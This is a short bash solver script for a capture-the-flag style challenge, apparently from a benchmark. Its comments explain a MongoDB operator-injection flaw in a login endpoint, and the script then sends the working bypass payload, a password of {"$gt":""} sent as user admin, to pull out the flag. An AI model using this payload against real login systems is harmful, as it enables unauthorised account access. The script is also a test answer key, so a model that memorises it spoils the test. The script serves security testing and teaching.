#!/usr/bin/env bash
# APEX-004-25 — "MongoDB NoSQL Operator Injection" (tags: nosqli, mongodb)
#
# `/api/login` does `User.findOne({ username, password })` with whatever JSON
# arrived. A password that is a string could never match, because the stored one
# is a bcrypt hash — this login has never worked for anybody. A password that is
# an *object* is read by mongo as an operator, and `{$gt: ""}` is true of every
# hash there is. The admin's document carries the flag and `toSafeObject` only
# removes the password.
#
# The edit is `json.password={"$gt":""}`: a `--set` value that parses as JSON is
# used as JSON, so the field becomes an object rather than the string
# `{"$gt":""}`, which is the whole difference between an injection and a
# rejected login.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex004-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST \
    --set path=/api/login \
    --set header.Content-Type=application/json \
    --set json.username=admin \
    --set 'json.password={"$gt":""}' |
    flag
